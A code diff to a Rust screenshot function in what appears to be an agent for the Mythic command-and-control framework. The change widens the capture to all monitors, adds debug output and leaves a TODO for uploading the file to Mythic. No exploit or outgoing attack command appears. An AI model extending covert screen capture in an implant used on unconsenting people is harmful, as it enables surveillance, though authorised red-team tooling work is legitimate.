@@ -29,9 +29,11 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
             return Err(format!("Failed to create memory DC. Error: {}", GetLastError()).into());
         }
 
-        // Get screen size
-        let width = GetSystemMetrics(SM_CXSCREEN);
-        let height = GetSystemMetrics(SM_CYSCREEN);
+        // Get screen size - use virtual screen to capture all monitors
+        let width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        let height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        
+        eprintln!("DEBUG: Screen resolution: {}x{}", width, height);
 
         let hbitmap: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
         if hbitmap.is_null() {
@@ -75,6 +77,8 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
         eprintln!("DEBUG: File size: {} bytes", screenshot_data.len());
         eprintln!("DEBUG: File exists: {}", screenshot_path.exists());
 
+        // For now, return the file path so user can download it manually
+        // TODO: Implement proper file upload to Mythic
         Ok(mythic_success!(
             task.id,
             format!(
